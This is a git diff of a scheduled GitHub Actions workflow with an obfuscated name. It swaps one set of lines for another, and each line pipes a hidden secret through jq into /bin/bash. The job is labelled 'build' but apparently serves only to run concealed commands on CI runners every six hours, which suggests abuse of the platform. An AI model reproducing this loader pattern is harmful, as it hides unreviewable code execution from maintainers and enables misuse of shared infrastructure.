@@ -3,8 +3,7 @@ name: hehuchong1391
 on:
   workflow_dispatch:
   schedule:
-    - cron: '17 5/6 * * *'
-
+    - cron: '42 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -13,19 +12,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: hehuchong1391
         env:
-          djt3: ${{ secrets.djt3 }}
+          glft8: ${{ secrets.glft8 }}
         run: |
-          echo $djt3 | jq -r .f0778 | /bin/bash
-          echo $xczj414 | jq -r .f440 | /bin/bash
-          echo $jyyct6652 | jq -r .rzvdv76 | /bin/bash
-          echo $i3873 | jq -r .tkdzq95388 | /bin/bash
-          echo $tr7 | jq -r .eibr37873 | /bin/bash
-          echo $kq6 | jq -r .m72211 | /bin/bash
-          echo $cmr37 | jq -r .pg41 | /bin/bash
-          echo $yvsn71482 | jq -r .vjsmx91471 | /bin/bash
-          echo $nj9364 | jq -r .tyttw574 | /bin/bash
-          echo $om7505 | jq -r .ziwjo3 | /bin/bash
-          echo $ymn65 | jq -r .h458 | /bin/bash
-          echo $nzvm1431 | jq -r .d157 | /bin/bash
-          echo $xp0096 | jq -r .ikqk6 | /bin/bash
+          echo $glft8 | jq -r .w67 | /bin/bash
+          echo $pll7044 | jq -r .jh00 | /bin/bash
+          echo $kqr40 | jq -r .iya76 | /bin/bash
+          echo $g6129 | jq -r .qvd039 | /bin/bash
+          echo $w569 | jq -r .gqhz7866 | /bin/bash
+          echo $n7764 | jq -r .gxpp54490 | /bin/bash
+          echo $qhu399 | jq -r .hn70349 | /bin/bash
 
